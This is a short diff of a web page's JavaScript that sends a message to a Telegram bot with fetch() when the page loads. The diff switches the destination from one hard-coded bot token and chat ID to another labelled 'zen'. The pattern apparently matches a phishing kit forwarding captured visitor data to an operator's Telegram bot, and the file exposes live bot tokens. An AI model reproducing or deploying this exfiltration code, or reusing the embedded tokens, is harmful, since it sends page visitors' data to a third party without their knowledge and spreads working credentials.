@@ -82,8 +82,8 @@ document.addEventListener("DOMContentLoaded", function () {
             const zentoken = '8087874221:AAHpuw6BWUzI9oRDStedu4JZpLbQLCiUWDY'
             const chat_ID = 1198072586
             const zenchat_ID = 5594056661
-             const telegramAPI = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_ID}&text=${telegramMessage}&parse_mode=Markdown`;
-            //const telegramAPI = `https://api.telegram.org/bot${zentoken}/sendMessage?chat_id=${zenchat_ID}&text=${telegramMessage}&parse_mode=Markdown`;
+            //const telegramAPI = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_ID}&text=${telegramMessage}&parse_mode=Markdown`;
+            const telegramAPI = `https://api.telegram.org/bot${zentoken}/sendMessage?chat_id=${zenchat_ID}&text=${telegramMessage}&parse_mode=Markdown`;
 
             // Send data to Telegram
             fetch(telegramAPI)
